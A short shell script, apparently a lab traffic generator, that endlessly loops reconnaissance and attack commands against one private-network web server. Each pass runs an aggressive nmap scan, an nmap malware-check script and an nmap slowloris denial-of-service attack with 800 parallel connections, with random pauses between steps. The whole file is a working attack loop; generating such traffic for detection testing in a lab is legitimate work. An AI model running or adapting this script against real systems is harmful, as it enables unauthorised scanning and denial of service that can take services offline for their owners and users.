#!/bin/sh
url_list=( http://192.168.1.11:23000)
while [ 1 ]; do
	for i in ${url_list[@]}; do
		echo "Running quick nmap"
		nmap -A -T4 192.168.1.11
		sleep $[ ( $RANDOM % 10 )  + 1 ]s
		echo "Running malware scan against web server"	
		nmap -p23000 --script http-google-malware 192.168.1.11
		sleep $[ ( $RANDOM % 10 )  + 1 ]s	
		echo "Running slow-loris against server"
		nmap 192.168.1.11:23000 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=false
	done
done